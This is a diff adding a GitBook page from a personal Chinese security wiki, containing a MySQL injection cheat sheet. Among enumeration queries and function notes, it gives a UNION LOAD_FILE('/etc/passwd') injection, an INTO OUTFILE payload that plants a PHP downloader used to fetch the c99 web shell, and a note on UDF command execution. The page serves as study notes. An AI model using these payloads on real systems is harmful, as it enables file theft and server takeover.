+        <li class="chapter " data-level="1.4.19" data-path="php-文件包含.html">
+            
+                <a href="php-文件包含.html">
+            
+                    
+                    php 文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.20" data-path="ssrf.html">
+            
+                <a href="ssrf.html">
+            
+                    
+                    ssrf
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.21" data-path="url.html">
+            
+                <a href="url.html">
+            
+                    
+                    url
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.22" data-path="webshell.html">
+            
+                <a href="webshell.html">
+            
+                    
+                    webshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.23" data-path="web渗透测试.html">
+            
+                <a href="web渗透测试.html">
+            
+                    
+                    web渗透测试
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.24" data-path="常用端口.html">
+            
+                <a href="常用端口.html">
+            
+                    
+                    常用端口
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.25" data-path="常见协议.html">
+            
+                <a href="常见协议.html">
+            
+                    
+                    常见协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.26" data-path="敏感配置文件.html">
+            
+                <a href="敏感配置文件.html">
+            
+                    
+                    敏感配置文件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.27" data-path="path_collect.html">
+            
+                <a href="path_collect.html">
+            
+                    
+                    文件读取漏洞路径收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.28" data-path="解析漏洞.html">
+            
+                <a href="解析漏洞.html">
+            
+                    
+                    解析漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    Kali2
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../Kali2/beef.html">
+            
+                <a href="../Kali2/beef.html">
+            
+                    
+                    Beef
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../Kali2/burpsuite.html">
+            
+                <a href="../Kali2/burpsuite.html">
+            
+                    
+                    BurpSuite
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../Kali2/code_editor.html">
+            
+                <a href="../Kali2/code_editor.html">
+            
+                    
+                    Code editor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../Kali2/gather-information.html">
+            
+                <a href="../Kali2/gather-information.html">
+            
+                    
+                    Gather Information
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../Kali2/hydra.html">
+            
+                <a href="../Kali2/hydra.html">
+            
+                    
+                    Hydra
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../Kali2/mitmproxy.html">
+            
+                <a href="../Kali2/mitmproxy.html">
+            
+                    
+                    MitmProxy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="../Kali2/pyenv.html">
+            
+                <a href="../Kali2/pyenv.html">
+            
+                    
+                    Pyenv
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.8" data-path="../Kali2/remote.html">
+            
+                <a href="../Kali2/remote.html">
+            
+                    
+                    Remote access
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="../Kali2/shell.html">
+            
+                <a href="../Kali2/shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.10" data-path="../Kali2/tmux.html">
+            
+                <a href="../Kali2/tmux.html">
+            
+                    
+                    Tmux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.11" data-path="../Kali2/w3af.html">
+            
+                <a href="../Kali2/w3af.html">
+            
+                    
+                    W3af
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.12" data-path="../Kali2/install&configure.html">
+            
+                <a href="../Kali2/install&configure.html">
+            
+                    
+                    install and configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.13" data-path="../Kali2/phpmyadmin.html">
+            
+                <a href="../Kali2/phpmyadmin.html">
+            
+                    
+                    phpmyadmin install and configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.14" data-path="../Kali2/flow_analysis.html">
+            
+                <a href="../Kali2/flow_analysis.html">
+            
+                    
+                    流量监听
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" >
+            
+                <span>
+            
+                    
+                    Vuln
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../Vuln/joomla.html">
+            
+                <a href="../Vuln/joomla.html">
+            
+                    
+                    Joomla
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../PHP/function.html">
+            
+                <a href="../PHP/function.html">
+            
+                    
+                    Function
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../PHP/configure.html">
+            
+                <a href="../PHP/configure.html">
+            
+                    
+                    configure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../PHP/note.html">
+            
+                <a href="../PHP/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.4" data-path="../PHP/正则匹配.html">
+            
+                <a href="../PHP/正则匹配.html">
+            
+                    
+                    正则匹配
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" >
+            
+                <span>
+            
+                    
+                    Docker
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../Docker/docker-compose.html">
+            
+                <a href="../Docker/docker-compose.html">
+            
+                    
+                    Docker Compose
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../Docker/dockerfile.html">
+            
+                <a href="../Docker/dockerfile.html">
+            
+                    
+                    Dockerfile
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../Docker/docker-api-in-python.html">
+            
+                <a href="../Docker/docker-api-in-python.html">
+            
+                    
+                    docker api in python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="../Docker/locale.html">
+            
+                <a href="../Docker/locale.html">
+            
+                    
+                    locale
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../Docker/note.html">
+            
+                <a href="../Docker/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="../Docker/openvpn.html">
+            
+                <a href="../Docker/openvpn.html">
+            
+                    
+                    openvpn
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.7" data-path="../Docker/安装和基本命令.html">
+            
+                <a href="../Docker/安装和基本命令.html">
+            
+                    
+                    安装和基本命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.8" data-path="../Docker/常用开发环境.html">
+            
+                <a href="../Docker/常用开发环境.html">
+            
+                    
+                    常用开发环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.9" data-path="../Docker/微容器.html">
+            
+                <a href="../Docker/微容器.html">
+            
+                    
+                    微容器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.10" data-path="../Docker/心得.html">
+            
+                <a href="../Docker/心得.html">
+            
+                    
+                    心得
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.11" data-path="../Docker/持续集成与自动发布.html">
+            
+                <a href="../Docker/持续集成与自动发布.html">
+            
+                    
+                    持续集成与自动发布
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" >
+            
+                <span>
+            
+                    
+                    HTTP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="../HTTP/cookie.html">
+            
+                <a href="../HTTP/cookie.html">
+            
+                    
+                    Cookie
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="../HTTP/encode_and_decode.html">
+            
+                <a href="../HTTP/encode_and_decode.html">
+            
+                    
+                    Encode and Decode
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="../HTTP/http请求格式.html">
+            
+                <a href="../HTTP/http请求格式.html">
+            
+                    
+                    HTTP请求格式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.4" data-path="../HTTP/proxy.html">
+            
+                <a href="../HTTP/proxy.html">
+            
+                    
+                    Proxy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.5" data-path="../HTTP/xpath.html">
+            
+                <a href="../HTTP/xpath.html">
+            
+                    
+                    XPATH
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" >
+            
+                <span>
+            
+                    
+                    Git
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="../Git/gist.html">
+            
+                <a href="../Git/gist.html">
+            
+                    
+                    Gist
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.2" data-path="../Git/git.html">
+            
+                <a href="../Git/git.html">
+            
+                    
+                    git
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.3" data-path="../Git/git_remote_operation.html">
+            
+                <a href="../Git/git_remote_operation.html">
+            
+                    
+                    git remote operation
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" >
+            
+                <span>
+            
+                    
+                    Image
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.11.1" data-path="../Image/png.html">
+            
+                <a href="../Image/png.html">
+            
+                    
+                    PNG
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" >
+            
+                <span>
+            
+                    
+                    JS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.12.1" data-path="../JS/xhr.html">
+            
+                <a href="../JS/xhr.html">
+            
+                    
+                    XHR
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13" >
+            
+                <span>
+            
+                    
+                    Note
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.13.1" data-path="../Note/ctf.html">
+            
+                <a href="../Note/ctf.html">
+            
+                    
+                    CTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.2" data-path="../Note/elk.html">
+            
+                <a href="../Note/elk.html">
+            
+                    
+                    ELK
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.3" data-path="../Note/google-hacking.html">
+            
+                <a href="../Note/google-hacking.html">
+            
+                    
+                    Google Hacking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.4" data-path="../Note/sql.html">
+            
+                <a href="../Note/sql.html">
+            
+                    
+                    Sql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.5" data-path="../Note/mysql.html">
+            
+                <a href="../Note/mysql.html">
+            
+                    
+                    mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.6" data-path="../Note/same-origin-policy.html">
+            
+                <a href="../Note/same-origin-policy.html">
+            
+                    
+                    same origin policy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.13.7" data-path="../Note/software.html">
+            
+                <a href="../Note/software.html">
+            
+                    
+                    software
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.14" >
+            
+                <span>
+            
+                    
+                    AWS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.14.1" data-path="../AWS/note.html">
+            
+                <a href="../AWS/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.15" >
+            
+                <span>
+            
+                    
+                    Python3
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.15.1" data-path="../Python3/string.html">
+            
+                <a href="../Python3/string.html">
+            
+                    
+                    String
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16" >
+            
+                <span>
+            
+                    
+                    Simiki
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.16.1" data-path="../Simiki/simiki-命令.html">
+            
+                <a href="../Simiki/simiki-命令.html">
+            
+                    
+                    simiki 命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.16.2" data-path="../Simiki/start with github page.html">
+            
+                <a href="../Simiki/start with github page.html">
+            
+                    
+                    start github page
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >Mysql 注入</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <pre><code>Select Nth Row    SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0
+
+Select Nth Char    SELECT substr(&#x2018;abcd&#x2019;, 3, 1); # returns c
+Bitwise AND    SELECT 6 &amp; 2; # returns 2
+SELECT 6 &amp; 1; # returns 0
+ASCII Value -&gt; Char    SELECT char(65); # returns A
+Char -&gt; ASCII Value    SELECT ascii(&#x2018;A&#x2019;); # returns 65
+Casting    SELECT cast(&#x2019;1&#x2032; AS unsigned integer);
+SELECT cast(&#x2019;123&#x2032; AS char);
+
+String Concatenation    SELECT CONCAT(&#x2018;A&#x2019;,&apos;B&#x2019;); #returns AB
+SELECT CONCAT(&#x2018;A&#x2019;,&apos;B&#x2019;,&apos;C&#x2019;); # returns ABC
+If Statement    SELECT if(1=1,&#x2019;foo&#x2019;,&apos;bar&#x2019;); &#x2014; returns &#x2018;foo&#x2019;
+Case Statement    SELECT CASE WHEN (1=1) THEN &#x2018;A&#x2019; ELSE &#x2018;B&#x2019; END; # returns A
+Avoiding Quotes    SELECT 0&#xD7;414243; # returns ABC
+Time Delay    SELECT BENCHMARK(1000000,MD5(&#x2018;A&#x2019;));
+SELECT SLEEP(5); # &gt;= 5.0.12
+Make DNS Requests    Impossible?
+Command Execution    If mysqld (&lt;5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.
+</code></pre>
+<h2 id="0x01-&#x4FE1;&#x606F;&#x6536;&#x96C6;">0x01 &#x4FE1;&#x606F;&#x6536;&#x96C6;</h2><pre><code>system_user()     &#x7CFB;&#x7EDF;&#x7528;&#x6237;&#x540D;
+user()            MYSQL&#x7528;&#x6237;&#x540D; 
+current_user()    &#x5F53;&#x524D;&#x7528;&#x6237;&#x540D;
+session_user()    &#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7528;&#x6237;&#x540D;
+database()        &#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;
+schema()          &#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x540D;
+version()         &#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7248;&#x672C;&#x4FE1;&#x606F;
+@@version
+load_file()       MYSQL&#x8BFB;&#x53D6;&#x672C;&#x5730;&#x6587;&#x4EF6;
+
+@@datadir         Location of DB files
+@@hostname        &#x670D;&#x52A1;&#x5668;&#x4E3B;&#x673A;&#x540D;</code></pre>
+<pre><code>List Users                SELECT user FROM mysql.user; &#x2014; priv
+List Password Hashes    SELECT host, user, password FROM mysql.user; &#x2014; priv
+
+SELECT distinct(db) FROM mysql.db &#x2014; priv</code></pre>
+<h2 id="0x02-informationschema">0x02 information_schema</h2><blockquote><p>MySQL &gt;= v5.0</p></blockquote><pre><code># &#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x5E93;
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA
+
+# &#x67E5;&#x770B;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x9762;&#x7684;&#x6570;&#x636E;&#x8868;
+SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema =&apos;&#x6570;&#x636E;&#x5E93;&#x540D;&apos;
+
+# &#x67E5;&#x770B;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x8868;&#x91CC;&#x9762;&#x7684;&#x5B57;&#x6BB5;
+#   &#x9ED8;&#x8BA4;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;
+SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name =&apos;&#x8868;&#x540D;&apos;
+#   &#x6307;&#x5B9A;&#x6570;&#x636E;&#x5E93;
+SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name =&apos;&#x8868;&#x540D;&apos; AND table_schema =&apos;&#x6570;&#x636E;&#x5E93;&#x540D;&apos;
+
+SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &apos;mysql&apos; AND table_schema != &apos;information_schema&apos;
+
+# find table which have a column called &#x2018;username&#x2019;
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = &#x2018;username&#x2019;
+
+# List Privilege
+SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;</code></pre>
+<h2 id="0x03-&#x6CE8;&#x91CA;">0x03 &#x6CE8;&#x91CA;</h2><pre><code> -- comment     # &apos;--&apos; &#x524D;&#x540E;&#x6709;&#x7A7A;&#x683C;
+
+#comment
+
+/*comment*/</code></pre>
+<h2 id="0x04-&#x6587;&#x4EF6;&#x6743;&#x9650;">0x04 &#x6587;&#x4EF6;&#x6743;&#x9650;</h2><p>&#x67E5;&#x8BE2;&#x7528;&#x6237;&#x8BFB;&#x5199;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#xFF1A;</p><pre><code># &#x9700;&#x8981;root&#x7528;&#x6237;&#x6765;&#x6267;&#x884C;     MySQL 4/5
+SELECT file_priv FROM mysql.user WHERE user = &apos;username&apos;;
+
+# &#x666E;&#x901A;&#x7528;&#x6237;&#x90FD;&#x53EF;&#x4EE5;     MySQL 5
+SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &apos;file&apos; AND grantee like &apos;%username%&apos;;     </code></pre>
+<h2 id="0x05-loadfile">0x05 load_file()</h2><p>&#x7528;&#x6237;&#x6709;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x5219;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</p><pre><code>&#x2026;&apos; UNION ALL SELECT LOAD_FILE(&apos;/etc/passwd&apos;)    &#x2014; priv, can only read world-readable files.
+
+
+SELECT LOAD_FILE(0x2F6574632F706173737764);</code></pre>
+<p>&#x8981;&#x6C42;&#xFF1A;</p><pre><code>&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x3002;
+LOAD_FILE()&#x51FD;&#x6570;&#x64CD;&#x4F5C;&#x6587;&#x4EF6;&#x7684;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x662F;@@datadir &#x3002;
+MySQL&#x7528;&#x6237;&#x5FC5;&#x987B;&#x62E5;&#x6709;&#x5BF9;&#x6B64;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x7684;&#x6743;&#x9650;&#x3002;
+&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#x5FC5;&#x987B;&#x5C0F;&#x4E8E; max_allowed_packet&#x3002;
+@@max_allowed_packet&#x7684;&#x9ED8;&#x8BA4;&#x5927;&#x5C0F;&#x662F;1047552 &#x5B57;&#x8282;
+&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x6216;&#x4E0D;&#x53EF;&#x8BFB;&#xFF0C;&#x8FD4;&#x56DE;NULL</code></pre>
+<h2 id="0x06-&#x5199;&#x6587;&#x4EF6;">0x06 &#x5199;&#x6587;&#x4EF6;</h2><p>&#x5982;&#x679C;&#x7528;&#x6237;&#x6709;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x53EF;&#x4EE5;&#x5199;&#x6587;&#x4EF6;</p><pre><code>INTO OUTFILE/DUMPFILE
+
+SELECT * FROM mytable INTO dumpfile &apos;/tmp/somefile&apos;; &#x2014; priv, write to file system</code></pre>
+<pre><code>SELECT &apos;&lt;? fwrite(fopen($_GET[f], \&apos;w\&apos;), file_get_contents($_GET[u])); ?&gt;&apos; INTO OUTFILE &apos;/var/www/get.php&apos;
+
+http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt</code></pre>
+<p>&#x6CE8;&#xFF1A;</p><pre><code>INTO OUTFILE &#x4E0D;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x5DF2;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x3002;
+INTO OUTFILE &#x5FC5;&#x987B;&#x662F;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x3002;
+&#x5F15;&#x53F7;&#x662F;&#x5FC5;&#x987B;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x53EF;&#x4EE5;&#x7F16;&#x7801;&#x8DEF;&#x5F84;&#x540D;</code></pre>
+<h2 id="0x-&#x5B9E;&#x6218;">0x &#x5B9E;&#x6218;</h2><h3 id="group-by-with-rollup">group by with rollup</h3><blockquote><p>alictf 2015 FuckMySQL</p></blockquote><p><a href="http://dev.mysql.com/doc/refman/5.5/en/group-by-modifiers.html" target="_blank">group by document</a></p><p>key code:</p><pre><code class="lang-php">$result = $db-&gt;query($sql);
+<span class="hljs-keyword">if</span> ($result-&gt;num_rows == <span class="hljs-number">1</span>) {
+    $row = $result-&gt;fetch_assoc();
+    <span class="hljs-keyword">if</span> ($row[<span class="hljs-string">&apos;key2&apos;</span>] == $_POST[<span class="hljs-string">&apos;key2&apos;</span>]) {
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=.= Y are u so diao? I will give you a flag!  &quot;</span>.$flag;
+        <span class="hljs-keyword">exit</span>;
+    }
+} <span class="hljs-keyword">else</span> {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I am fucking!&quot;</span>;
+}</code></pre>
+<h2 id="&#x53C2;&#x8003;&#xFF1A;">&#x53C2;&#x8003;&#xFF1A;</h2><p><a href="http://drops.wooyun.org/tips/123" target="_blank">&#x4E4C;&#x4E91; mySql &#x6CE8;&#x5165;&#x79D1;&#x666E;</a></p><p><a href="http://drops.wooyun.org/tips/7299" target="_blank">&#x4E4C;&#x4E91; mysql &#x6CE8;&#x5165;&#x6280;&#x5DE7;</a></p><p><a href="http://www.openwall.com/john/" target="_blank">crack mysql password</a></p>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="dns.html" class="navigation navigation-prev " aria-label="Previous page: DNS">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="note.html" class="navigation navigation-next " aria-label="Next page: Note">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Mysql 注入","date":"2016-04-21 11:50","level":"1.4.4","depth":2,"next":{"title":"Note","level":"1.4.5","depth":2,"path":"WebSecurity/note.md","ref":"WebSecurity/note.md","articles":[]},"previous":{"title":"DNS","level":"1.4.3","depth":2,"path":"WebSecurity/dns.md","ref":"WebSecurity/dns.md","articles":[]},"dir":"ltr"},"config":{"plugins":["livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"janes","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Wiki | janes","language":"cn","gitbook":">= 3.2.0"},"file":{"path":"WebSecurity/mysqlinject.md","mtime":"2016-08-16T14:00:50.457Z","type":"markdown"},"gitbook":{"version":"3.2.0","time":"2016-08-16T16:38:45.378Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
     </body>
 </html>
+
